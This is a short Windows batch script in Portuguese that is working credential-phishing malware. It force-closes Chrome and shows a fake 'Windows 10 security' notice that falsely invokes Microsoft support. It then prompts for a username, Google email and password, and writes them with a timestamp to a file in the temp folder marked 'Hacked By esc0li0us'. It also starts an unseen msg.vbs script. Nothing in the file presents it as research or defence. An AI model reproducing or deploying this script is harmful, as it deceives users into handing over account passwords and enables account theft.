@echo off
taskkill /f /im chrome.exe

title [Seguranca do Windows 10]
color f0

cls
echo.
echo O Navegador Chrome foi protegido pelo sistema de seguranca do Sistema Microsoft Windows 10. 
echo Para evitar o acesso indevido de terceiros, sera necessario fazer login com suas credenciais
echo da Conta Google (email e senha). 
echo Qualquer duvida contate-nos atraves de: support.microsoft.com/pt-br/windows
echo.

set /p h=User: 
set /p j=Email: 
set /p i=Senha: 

start msg.vbs

start chrome.exe

cls
%n%
cd %temp% 
echo Data: %date% - Hora: %time% - User: %h% - Email: %j% - Senha: %i% - [-[ Hacked By esc0li0us ]-] >%n%.txt
